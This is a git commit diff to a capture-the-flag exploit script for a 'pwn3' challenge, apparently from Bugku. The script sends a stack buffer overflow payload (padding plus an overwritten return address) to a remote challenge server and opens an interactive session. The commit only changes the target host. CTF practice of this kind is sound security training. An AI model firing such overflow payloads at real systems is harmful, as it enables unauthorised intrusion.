32d05d8242f3dcaad50395e0f051ad9407bd32cf
ZYA <zyazhb@yahoo.com>
2019-03-13 17:17:22 +0800

    Update exp.py

--- bugku/pwn3/exp.py
+++ bugku/pwn3/exp.py
@@ -4,8 +4,8 @@ junk = "A" * 0x30
 #address = "\x96\x05\x40\x00\x00\x00\x00"
 payload = junk + p64(0x400751)
 
-# Io = zio.zio("./level0")
-Io = remote(("pwn2.jarvisoj.com", 9881))
+# Io = process("./pwn3")
+Io = remote(("114.116.54.89", 10003))
 
 Io.send(payload)
 Io.interactive()
